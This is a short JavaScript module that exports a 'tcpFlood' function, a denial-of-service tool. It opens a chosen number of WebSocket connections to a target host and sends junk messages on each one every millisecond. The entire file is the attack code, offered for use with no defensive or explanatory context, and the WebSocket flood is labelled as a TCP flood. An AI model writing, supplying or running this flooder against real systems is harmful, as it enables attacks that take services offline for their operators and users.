function tcpFlood(target, threads) {
  if (!target) {
    console.error("Target URL is required for TCP flood.");
    return;
  }

  threads = threads && threads > 0 ? threads : 1;

  try {
    const url = new URL(target);
    const hostname = url.hostname;
    const port = url.port || 80;

    for (let i = 0; i < threads; i++) {
      const socket = new WebSocket(`ws://${hostname}:${port}`);

      socket.onopen = () => {
        let counter = 0;
        setInterval(() => {
          try {
            const payload = `TCP Flood: Junk data ${counter++}`;
            socket.send(payload);
          } catch (e) {
            socket.close();
          }
        }, 1);
      };

      socket.onerror = (error) => {
        console.error("WebSocket error:", error);
      };

      socket.onclose = () => {
        console.log("WebSocket connection closed.");
      };
    }
  } catch (e) {
    console.error("Error:", e);
  }
}

export { tcpFlood };